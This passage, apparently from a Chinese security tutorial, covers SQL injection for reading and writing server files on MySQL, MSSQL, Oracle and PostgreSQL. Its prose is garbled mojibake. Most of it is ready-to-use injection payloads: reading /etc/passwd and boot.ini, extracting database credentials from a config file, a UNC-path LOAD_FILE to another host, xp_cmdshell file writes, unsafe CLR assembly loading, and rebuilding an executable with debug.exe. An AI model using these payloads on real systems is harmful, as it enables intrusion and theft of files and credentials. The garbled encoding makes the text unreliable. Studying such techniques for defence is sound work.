title="MySQL"></a>MySQL</h5><p>MySQLæä¾›LOAD DATA INFILEå’ŒLOAD_FILEå‘½ä»¤å°†æ–‡æœ¬æ–‡ä»¶è¯»åˆ°æ•°æ®åº“ä¸­ã€‚</p><p>LOAD DATA INFILEè¯­å¥ä»¥éå¸¸å¿«çš„é€Ÿåº¦ä»æ–‡æœ¬æ–‡ä»¶ä¸­è¯»å–ä¸€è¡Œæ•°æ®è‡³è¡¨ä¸­ã€‚æ–‡ä»¶åå¿…é¡»æ˜¯å­—ç¬¦ä¸²å­—é¢å€¼ã€‚</p><p>ç”¨æ³•</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#å…ˆåˆ›å»ºä¸€ä¸ªæ–‡æœ¬test.txtï¼Œæ ¼å¼ï¼š</span><span class="token comment">#name school old</span><span class="token comment">#åˆ›å»ºä¸€å¼ è¡¨æ¥ä¿å­˜è¯»å–çš„ä¿¡æ¯</span><span class="token keyword">create</span> <span class="token keyword">table</span> test<span class="token punctuation">(</span>name <span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">,</span>school <span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">,</span>old <span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#è¯»å–å¹¶å¡«å……è¡¨</span><span class="token keyword">load</span> <span class="token keyword">data</span> <span class="token keyword">infile</span> <span class="token string">'/xxx/test.txt'</span> <span class="token keyword">into</span> <span class="token keyword">table</span> test <span class="token keyword">fields</span> <span class="token keyword">terminated</span> <span class="token keyword">by</span> <span class="token string">''</span><span class="token punctuation">;</span><span class="token comment">#è¯»å–æˆåŠŸ</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>LOAD_FILEè¯¥å‡½æ•°ä¸åˆ›å»ºè¡¨å¯ä»¥ç›´æ¥ä¼ é€’ç»“æœ</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> load_file<span class="token punctuation">(</span><span class="token string">'/xxx/test.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#æ³¨å…¥å›æ˜¾æ–‡ä»¶çš„å†…å®¹</span>dvwa<span class="token operator">/</span>vulnerabilities<span class="token operator">/</span>sqli<span class="token operator">/</span>?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' union select 1,load_file('</span><span class="token operator">/</span>etc<span class="token operator">/</span>passwd'<span class="token punctuation">)</span> <span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>Submit<span class="token operator">=</span>Submit<span class="token comment">#</span><span class="token comment">#é€šå¸¸etc/passwdæ¢æˆ16è¿›åˆ¶ï¼Œä»¥çœç•¥å•å¼•å·</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#è·å–äºŒè¿›åˆ¶æ–‡ä»¶</span><span class="token string">'union select NULL,HEX(LOAD_FILE('</span><span class="token operator">/</span>tmp<span class="token operator">/</span><span class="token keyword">temp</span><span class="token punctuation">.</span>ini'<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>LOAD_FILEï¼ˆï¼‰è¿˜æ¥æ”¶UNCï¼ˆé€šç”¨å‘½åçº¦å®šï¼‰è·¯å¾„ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨å…¶ä»–æœºå™¨ä¸Šæœç´¢æ–‡ä»¶ï¼Œç”šè‡³å¯ä»¥å¼•å¯¼MySQLæœåŠ¡å™¨è¿æ¥åˆ°ä»–ä»¬è‡ªå·±çš„æœºå™¨</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> load_file<span class="token punctuation">(</span><span class="token string">'//172.16.125.2/temp_smb/test.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="Mssql"><a href="#Mssql" class="headerlink" title="Mssql"></a>Mssql</h5><p>æ”»å‡»è€…ï¼ˆå·±ç»è·å–ç³»ç»Ÿç®¡ç†å‘˜æƒé™ï¼‰é€šå¸¸é¦–å…ˆå€Ÿç”¨çš„æ˜¯BULK INSERTè¯­å¥ã€‚</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//test.asp?sname=%</span><span class="token comment">#è¿”å›äº†æ‰€æœ‰ç”¨æˆ·ï¼Œæ³¨å…¥ç‚¹</span><span class="token comment">#ç¡®å®šæ‰€è¿è¡Œçš„æƒé™ sa</span>http:<span class="token comment">//test.asp?sname='union select NULL,NULL,NULL,loginame FROM master..sysprocesses</span><span class="token keyword">WHERE</span> spid <span class="token operator">=</span> @<span class="token variable">@SPID</span><span class="token comment">-- </span><span class="token comment">#æ‰§è¡Œè¯»å–å‘½ä»¤</span>http:<span class="token comment">//test.asp?sname='; create table hacked(line varchar(8000)); bulk insert hacked from 'c:\boot.ini';-- </span><span class="token comment">#æŸ¥çœ‹è¡¨å°±ä¼šçœ‹åˆ°å·²ç»æ’å…¥</span>http:<span class="token comment">//test.asp?sname='union select NULL,NULL,NULL,line from hacked-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Squeezaå·¥å…·ï¼Œå…è®¸æ”»å‡»è€…åœ¨åå°ä¸´æ—¶è¡¨ä¸­æ‰§è¡Œæ‰¹é‡æ’å…¥ï¼Œç„¶åä½¿ç”¨æ‰€é€‰çš„é€šä¿¡æœºåˆ¶ï¼ˆDNSã€é”™è¯¯æ¶ˆæ¯ã€æ—¶é—´ï¼‰æ¥æå–ä¿¡æ¯ï¼Œæœ€åå†åœ¨æ”»å‡»è€…çš„æœºå™¨ä¸Šé‡å»ºè¯¥æ–‡ä»¶ã€‚</p><p>ä½¿ç”¨ä¸€ä¸ªé’ˆå¯¹ç›®æ ‡åº”ç”¨ç¨‹åºçš„squeeza.configæ–‡ä»¶æ¥æå–ä¸¤ä¸ªæ–‡ä»¶â€”â€”è¿œç¨‹æœåŠ¡å™¨çš„ boot.ini å’ŒäºŒè¿›åˆ¶çš„ c:\winnt\system32\net.exe</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">!</span>coÑ€y c:<span class="token punctuation">\</span>boot.ini stolen-boot.ini c:<span class="token punctuation">\</span>winnt<span class="token punctuation">\</span>system32<span class="token punctuation">\</span>net.exe stolen-net.exe<span class="token operator">!</span>quit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>ç¼ºå°‘æ‰¹é‡æ’å…¥æ–¹æ³•</p><p>ä½¿ç”¨(æ»¥ç”¨)Scripting.FileSystemObjectã€‚</p><p>å¼•å…¥äº†å…¬å…±è¯­è¨€è¿è¡Œæ—¶(Microsoft Language Runtimeï¼ŒCLR)ã€‚å®ƒå…è®¸å¼€å‘äººå‘˜å°†.NETäºŒè¿›åˆ¶æ–‡ä»¶è½»è€Œæ˜“ä¸¾åœ°é›†æˆåˆ°æ•°æ®åº“ä¸­ã€‚</p><p>é€šè¿‡å‘SQL Serverå¯¼å…¥ç¨‹åºé›†æ—¶æ‰€ä½¿ç”¨çš„æ–¹æ³•æ¥å®ç°ï¼ŒSQL Server 2005é»˜ è®¤ç¦ç”¨äº†CLRé›†æˆã€‚æ‹¥æœ‰ç³»ç»Ÿç®¡ç†å‘˜æˆ–ä¸ä¹‹ç­‰ä»·çš„æƒé™ï¼Œä»¥ä½¿ç”¨sp configureå­˜å‚¨è¿‡ç¨‹é‡æ–°å¯ç”¨è¯¥åŠŸèƒ½</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">exec</span> sp_configure <span class="token string">'show advanced options'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token keyword">RECONFIGURE</span><span class="token punctuation">;</span><span class="token keyword">exec</span> sp_configure <span class="token string">'clr enabled'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token keyword">RECONFIGURE</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#ä½¿ç”¨CREATE ASSEMBLYå‡½æ•°ä»è¿œç¨‹æœåŠ¡å™¨åŠ è½½ä»»ä½•.NETäºŒè¿›åˆ¶æ–‡ä»¶è‡³æ•°æ®åº“ä¸­</span><span class="token comment">#ä½¿ç”¨ä¸‹åˆ—æ³¨å…¥å­—ç¬¦ä¸²åŠ è½½.NETç¨‹åºé›†c:\temp\test.exeï¼š</span>sname<span class="token operator">=</span><span class="token string">';create assembly sqb from '</span>c:\<span class="token keyword">temp</span>\test<span class="token punctuation">.</span>exe<span class="token string">' with permission_set =unsafe-- #SQL Serveråœ¨sys.assembly_filesè¡¨ä¸­å­˜å‚¨åŸå§‹çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼ˆä½œä¸ºHEXå­—ç¬¦ä¸²ï¼‰sname='</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token boolean">NULL</span><span class="token punctuation">,</span>master<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>fn_varbintohexstr<span class="token punctuation">(</span>substring<span class="token punctuation">(</span>content<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">from</span> sys<span class="token punctuation">.</span>assembly_files<span class="token comment">-- </span><span class="token comment">#å°†äºŒè¿›åˆ¶æ–‡ä»¶è¯»å–åˆ°webé¡µé¢</span><span class="token keyword">create</span> assembly sqb <span class="token keyword">from</span> <span class="token string">'c:\temp\test.exe'</span><span class="token comment">#æ·»åŠ åˆ°åŸå§‹åº“</span><span class="token keyword">alter</span> assembly sqb <span class="token keyword">add</span> <span class="token keyword">file</span> <span class="token keyword">from</span> <span class="token string">'c:\windows\system32\net.exe'</span><span class="token keyword">alter</span> assembly sqb <span class="token keyword">add</span> <span class="token keyword">file</span> <span class="token keyword">from</span> <span class="token string">'c:\temp\test.txt'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="Oracle-5"><a href="#Oracle-5" class="headerlink" title="Oracle"></a>Oracle</h5><p> utl_file_dir/Oracle ç›®å½•ã€Javaã€Oracle Textä¸‰ç§æ¥å£è®¿é—®æ–‡ä»¶</p><p> utl_file_dir/Oracle ç›®å½•</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">utl_file<span class="token punctuation">(</span>PL<span class="token operator">/</span><span class="token keyword">SQL</span><span class="token punctuation">,</span> Oracle <span class="token number">8</span> è‡³ <span class="token number">11</span>g<span class="token punctuation">)</span>DBMS_LOB<span class="token punctuation">(</span>PL<span class="token operator">/</span><span class="token keyword">SQL</span><span class="token punctuation">,</span> Oracle <span class="token number">8</span> è‡³ <span class="token number">11</span>g<span class="token punctuation">)</span><span class="token comment">#ä»rds.txtæ–‡ä»¶è¯»å–äº†1000ä¸ªå­—èŠ‚(ä»ç¬¬1ä¸ªå­—èŠ‚å¼€å§‹)ï¼Œè¯¥æ–‡ä»¶ä½äºMEDIA DIRç›®å½•ä¸­ã€‚</span><span class="token keyword">DECLARE</span>buf varchar2<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span><span class="token punctuation">;</span>BEG <span class="token operator">IN</span>Lob_loc:<span class="token operator">=</span> BFILENAME<span class="token punctuation">(</span><span class="token string">'MEDIA_DIR'</span><span class="token punctuation">,</span><span class="token string">'rds.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>DBMS_LOB<span class="token punctuation">.</span><span class="token keyword">OPEN</span><span class="token punctuation">(</span>Lob_loc<span class="token punctuation">,</span> DBMS_LOB<span class="token punctuation">.</span>LOB_READONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>DBMS_LOB<span class="token punctuation">.</span><span class="token keyword">READ</span><span class="token punctuation">(</span>Lob_loc<span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>dbms_output<span class="token punctuation">.</span>put_line<span class="token punctuation">(</span>utl_raw<span class="token punctuation">.</span>cast_to_varchar2<span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>DBMS_LOB<span class="token punctuation">.</span><span class="token keyword">CLOSE</span><span class="token punctuation">(</span>Lob_loc<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">END</span><span class="token punctuation">;</span>å¤–éƒ¨è¡¨<span class="token punctuation">(</span>PL<span class="token operator">/</span><span class="token keyword">SQL</span><span class="token punctuation">,</span> Oracle <span class="token number">9</span>i R2 è‡³ <span class="token number">11</span>g<span class="token punctuation">)</span><span class="token keyword">create</span> directory ext <span class="token keyword">as</span> <span class="token string">'C:\';CREATE TABLE ext_tab(line varchar2(256))ORGANIZATION EXTERNAL (TYPE oracle_loaderDEFAULT DIRECTORY extACCESS PARAMETERS (RECORDS DELIMITED BY NEWLINEBADFILE '</span>bad_data<span class="token punctuation">.</span>bad<span class="token string">'LOGFILE '</span>log_data<span class="token punctuation">.</span>log<span class="token string">'FIELDS TERMINATED BY '</span><span class="token punctuation">,</span><span class="token string">'MISSING FIELD VALUES ARE NULLREJECT ROWS WITH ALL NULL FIELDS(line))LOCATION ('</span>victim<span class="token punctuation">.</span>txt<span class="token string">'))PARALLELREJECT LIMIT 0NOMONITORING;Select * from ext_tab;'</span>XMLType<span class="token punctuation">(</span>PL<span class="token operator">/</span><span class="token keyword">SQL</span><span class="token punctuation">,</span> Oracle <span class="token number">9</span>i R2 è‡³ <span class="token number">11</span>g<span class="token punctuation">)</span><span class="token comment">#ä»data-source.xmlæ–‡ä»¶ä¸­è¯»å–ç”¨æˆ·åã€æ˜æ–‡å£ä»¤å’Œè¿æ¥å­—ç¬¦ä¸²</span><span class="token keyword">select</span> extractvalue<span class="token punctuation">(</span><span class="token keyword">value</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'/connection-factory/@user'</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token string">'/'</span><span class="token operator">||</span>extractvalue<span class="token punctuation">(</span><span class="token keyword">value</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'/connection-factory/@password'</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token string">'@'</span><span class="token operator">||</span>substr<span class="token punctuation">(</span>extractvalue<span class="token punctuation">(</span><span class="token keyword">value</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'/connection-factory/@url'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>instr<span class="token punctuation">(</span>extractvalue<span class="token punctuation">(</span><span class="token keyword">value</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'/connection-factory/@url'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'//'</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span> conn <span class="token keyword">FROM</span> <span class="token keyword">table</span><span class="token punctuation">(</span>XMLSequence<span class="token punctuation">(</span>extract<span class="token punctuation">(</span>xmltype<span class="token punctuation">(</span>bfilename<span class="token punctuation">(</span><span class="token string">'GETPWDIR'</span><span class="token punctuation">,</span><span class="token string">'datasources.xml'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>nls_charset_id<span class="token punctuation">(</span><span class="token string">'WE8ISO8859P1'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'/data-sources/connection-pool/connection-factory'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>c<span class="token operator">/</span><span class="token comment">#Oracle Textæ˜¯ä¸€ç§å¾ˆå°‘æœ‰äººçŸ¥é“çš„è¯»å–æ–‡ä»¶å’ŒURInateçš„æŠ€æœ¯ã€‚å®ƒä¸éœ€è¦Javaæˆ–utl_file_dir/Oracleç›®å½•ï¼Œåªéœ€å°†æƒ³è¯»å–çš„æ–‡ä»¶æˆ–URLæ’å…¥åˆ°ä¸€å¼ è¡¨ä¸­å¹¶åˆ›å»ºä¸€ä¸ªå…¨æ–‡ç´¢å¼•æˆ–è€…ä¸€ç›´ç­‰å¾…å…¨æ–‡ç´¢å¼•åˆ›å»ºæˆåŠŸå³å¯ã€‚è¯¥ç´¢å¼•äº†åŒ…å«æ•´ä¸ªæ–‡ä»¶çš„å†…å®¹ã€‚</span><span class="token comment">#ä¸‹åˆ—ç¤ºä¾‹ä»£ç è¯´æ˜äº†å¦‚ä½•é€šè¿‡å°†boot.iniæ’å…¥åˆ°ä¸€å¼ è¡¨ä¸­æ¥è¯»å–è¯¥æ–‡ä»¶</span><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> files <span class="token punctuation">(</span>id NUMBER <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span><span class="token punctuation">,</span>path <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span> <span class="token keyword">UNIQUE</span><span class="token punctuation">;</span>ot_format <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> files <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'c:\boot.ini'</span><span class="token punctuation">,</span> <span class="token boolean">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">CREATE</span> <span class="token keyword">INDEX</span> file_index <span class="token keyword">ON</span> files<span class="token punctuation">(</span>path<span class="token punctuation">)</span> INDEXTYPE <span class="token operator">IS</span> ctxsys<span class="token punctuation">.</span>contextPARAMETERS<span class="token punctuation">(</span><span class="token string">'datastore ctxsys.file_datastore format column ot_format'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">-- retrieve data from the fulltext index</span><span class="token keyword">Select</span> token_text <span class="token keyword">from</span> dr$file_index$i<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="PostgreSQL-3"><a href="#PostgreSQL-3" class="headerlink" title="PostgreSQL"></a>PostgreSQL</h5><p>PostgreSQLæä¾›äº†å†…ç½®çš„COPYåŠŸèƒ½ï¼Œå¯ä»¥å°†æ–‡æœ¬æ–‡ä»¶å¤åˆ¶åˆ°è¡¨ä¸­çš„textå­—æ®µï¼Œä½¿ç”¨COPY åŠŸèƒ½å¤åˆ¶æ–‡ä»¶æ—¶ï¼Œè¯¥æ–‡æœ¬æ–‡ä»¶åº”è¯¥æ˜¯å®Œå…¨å¯è¯»çš„(world readable),æˆ–è€…è¿è¡ŒPostgreSQLè¿›ç¨‹çš„ç”¨æˆ·(é€šå¸¸æ˜¯postgresç”¨æˆ·)åº”è¯¥æ˜¯è¯¥æ–‡ä»¶çš„æ‰€æœ‰è€…ã€‚</p><p>ä¸‹é¢çš„ä¾‹å­æ¼”ç¤ºäº†æ”»å‡»è€…å¦‚ä½•è¯»å– â€˜etc/passwdâ€™æ–‡ä»¶çš„å†…å®¹ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#åˆ›å»ºä¸€ä¸ªä¸´æ—¶è¡¨</span>http:<span class="token comment">//10.10.10.114/test.php?id=1;CREATE table temp (name text);-- </span><span class="token comment">#å°†æ–‡ä»¶å¤åˆ¶åˆ°è¡¨ä¸­</span>http:<span class="token comment">//10.10.10.114/test.php?id=1;copy temp from '/etc/passwd'-- </span><span class="token comment">#è¯»å–è¡¨ã€‚åœ¨å°†æ–‡ä»¶å¤åˆ¶åˆ°è¡¨ä¸­ä¹‹åï¼Œå°±å¯ä»¥ä½¿ç”¨SQLæ³¨å…¥æŠ€æœ¯æ¥è¯»å–è¯¥è¡¨ï¼Œæ¯”å¦‚ä½¿ç”¨ unionæŠ€æœ¯æˆ–ç›²æ³¨æŠ€æœ¯</span>http:<span class="token comment">//10.10.10.114/test.php?id=l union select 2,name from temp-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="å†™æ–‡ä»¶"><a href="#å†™æ–‡ä»¶" class="headerlink" title="å†™æ–‡ä»¶"></a>å†™æ–‡ä»¶</h4><h5 id="MySQL-1"><a href="#MySQL-1" class="headerlink" title="MySQL"></a>MySQL</h5><p>select into outfileï¼ˆdumpfileï¼‰è¯¥å‘½ä»¤å¯ä»¥å°†ä¸€æ¡selectè¯­å¥çš„ç»“æœå†™åˆ°MySQLè¿›ç¨‹æ‰€æœ‰è€…æ‹¥æœ‰çš„å®Œå…¨å¯è¯»çš„æ–‡ä»¶ä¸­ï¼ˆdumpfileå…è®¸å†™äºŒè¿›åˆ¶æ–‡ä»¶ï¼‰</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token string">'test'</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">'/tmp/test.txt'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#ä½¿ç”¨ä¸‹åˆ—æœç´¢å­—ç¬¦ä¸²ï¼š</span>aaa <span class="token string">'union select NULL,'</span>SensePost <span class="token number">2008</span>\n<span class="token string">' into dumpfile '</span><span class="token operator">/</span>tmp<span class="token operator">/</span>sp<span class="token punctuation">.</span>txt' <span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ä½¿ç”¨çš„æ˜¯dumpfile(å…è®¸è¾“å‡ºäºŒè¿›åˆ¶æ–‡ä»¶)è€Œé outfileï¼Œè¿™æ ·ä¸€æ¥ï¼Œè¦æƒ³æ­£å¸¸ç»“æŸä¸€è¡Œï¼Œå°±å¿…é¡»æä¾›\n</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> UNHEX<span class="token punctuation">(</span><span class="token string">'53656E7365506F7374203038'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#unhex()å’Œhex()ç›¸å</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="Mssql-1"><a href="#Mssql-1" class="headerlink" title="Mssql"></a>Mssql</h5><p>è¯»å–æ–‡ä»¶çš„scripting.filesystemå¯¹è±¡æ–¹æ³•æ¥æœ‰æ•ˆåœ°å‘æ–‡ä»¶ç³»ç»Ÿå†™æ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨è¯¥æŠ€æœ¯æ¥å†™äºŒè¿›åˆ¶æ–‡ä»¶ï¼ŒæŸäº›ä»£ç é¡µé¢ä½¿ç”¨è¯¥æŠ€æœ¯çš„è¯ä¼šå‡ºç°é”™è¯¯ï¼Œå¯¹äºè¿™ç§æƒ…å†µï¼Œå¯ä»¥ä½¿ç”¨å…¶ä»–å¯¹è±¡è€Œéfilesystemå¯¹è±¡ï¼Œæ¯”å¦‚ADODB.Streamã€‚</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#æ‰¹é‡å¤åˆ¶ç¨‹åºBCP</span>C:\<span class="token keyword">temp</span><span class="token operator">&gt;</span>bcp <span class="token string">"select name from sysobjects"</span> queryout testout<span class="token punctuation">.</span>txt <span class="token operator">-</span>c <span class="token operator">-</span>S <span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span> <span class="token operator">-</span>U sa <span class="token operator">-</span>P<span class="token string">""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#ä½¿ç”¨é‡å®šå‘è¿ç®—ç¬¦&gt;&gt;åˆ›å»ºæ–‡æœ¬æ–‡ä»¶ï¼š</span><span class="token keyword">exec</span> xp_cmdshell <span class="token string">'echo Thisis a test &gt;c:\temp\test.txt'</span><span class="token keyword">exec</span> xp_cmdshell <span class="token string">'echo Thisis line2 &gt;&gt;c:\temp\test.txt'</span><span class="token keyword">exec</span> xp_cmdshell <span class="token string">'echo Thisis line3&gt;&gt;c:\temp\test.txt'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#å…ˆåˆ›å»ºä¸€ä¸ªdebug.exeè„šæœ¬æ–‡ä»¶ï¼Œç„¶åå°†å®ƒä¼ é€’ç»™debug.exeä»¥è½¬æ¢æˆä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ã€‚</span>C:\<span class="token keyword">temp</span><span class="token operator">&gt;</span>debug <span class="token operator">&lt;</span> demo<span class="token punctuation">.</span>scr<span class="token operator">-</span>n demo<span class="token punctuation">.</span>com<span class="token operator">-</span>e <span class="token number">0000</span> <span class="token number">4</span>D <span class="token number">5</span>A <span class="token number">90</span> <span class="token number">00</span> <span class="token number">03</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">04</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> FF FF <span class="token number">00</span> <span class="token number">00</span><span class="token operator">-</span>e <span class="token number">0010</span> B8 <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">40</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> o0 o0 <span class="token number">00</span><span class="token operator">-</span>Ğµ <span class="token number">0040</span> <span class="token number">0</span>E <span class="token number">1</span>F BA OE <span class="token number">00</span> B4 <span class="token number">09</span> CD <span class="token number">21</span> B8 <span class="token number">01</span> <span class="token number">4</span>C CD <span class="token number">21</span> <span class="token number">54</span> <span class="token number">68</span><span class="token operator">-</span>Ğµ <span class="token number">0050</span> <span class="token number">69</span> <span class="token number">73</span> <span class="token number">20</span> <span class="token number">70</span> <span class="token number">72</span> <span class="token number">6</span>F <span class="token number">67</span> <span class="token number">72</span> <span class="token number">61</span> <span class="token number">6</span>D <span class="token number">20</span> <span class="token number">63</span> <span class="token number">61</span> <span class="token number">6</span>E <span class="token number">6</span>E <span class="token number">6</span>F<span class="token operator">-</span>Ğµ <span class="token number">0060</span> <span class="token number">74</span> <span class="token number">20</span> <span class="token number">62</span> <span class="token number">65</span> <span class="token number">20</span> <span class="token number">72</span> <span class="token number">75</span> <span class="token number">6</span>E <span class="token number">20</span> <span class="token number">69</span> <span class="token number">6</span>E <span class="token number">20</span> <span class="token number">44</span> <span class="token number">4</span>F <span class="token number">53</span> <span class="token number">20</span><span class="token operator">-</span>e <span class="token number">0070</span> <span class="token number">6</span>D <span class="token number">6</span>F <span class="token number">64</span> <span class="token number">65</span> <span class="token number">2</span>E OD OD <span class="token number">0</span>A <span class="token number">24</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span>rexCX <span class="token number">0000</span>:<span class="token number">4200</span><span class="token operator">-</span>w <span class="token number">0</span>Writing <span class="token number">04200</span> bytes<span class="token operator">-</span>qC:\<span class="token keyword">temp</span><span class="token operator">&gt;</span>dir demo<span class="token operator">*</span><span class="token number">2008</span><span class="token operator">/</span><span class="token number">12</span><span class="token operator">/</span><span class="token number">27</span> <span class="token number">03</span>:<span class="token number">18</span>p<span class="token number">16</span><span class="token punctuation">,</span><span class="token number">896</span> demo<span class="token punctuation">.</span>com<span class="token number">2005</span><span class="token operator">/</span><span class="token number">11</span><span class="token operator">/</span><span class="token number">21</span> <span class="token number">11</span>:<span class="token number">08</span>a<span class="token number">61</span>r280 demo<span class="token punctuation">.</span>scrcopy <span class="token operator">/</span>b chunk<span class="token operator">-</span><span class="token number">1.</span>exe_ <span class="token operator">+</span> chunk<span class="token operator">-</span><span class="token number">2.</span>exe_ <span class="token operator">+</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token operator">+</span> chunk<span class="token operator">-</span>n<span class="token 